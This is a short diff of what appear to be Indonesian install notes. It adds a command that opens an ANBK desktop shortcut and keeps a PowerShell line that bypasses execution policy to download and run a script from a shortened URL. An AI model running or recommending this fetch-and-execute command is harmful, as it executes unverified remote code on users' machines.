@@ -1,4 +1,7 @@
- cara install
+c:\windows\system32\cmd.exe /c "start "" "%USERPROFILE%\Desktop\ANBK.lnk""
+
+
+cara install
 
 c:\windows\system32\cmd.exe /c "powershell -ep bypass iex(irm s.id/iexambanbk)"
 
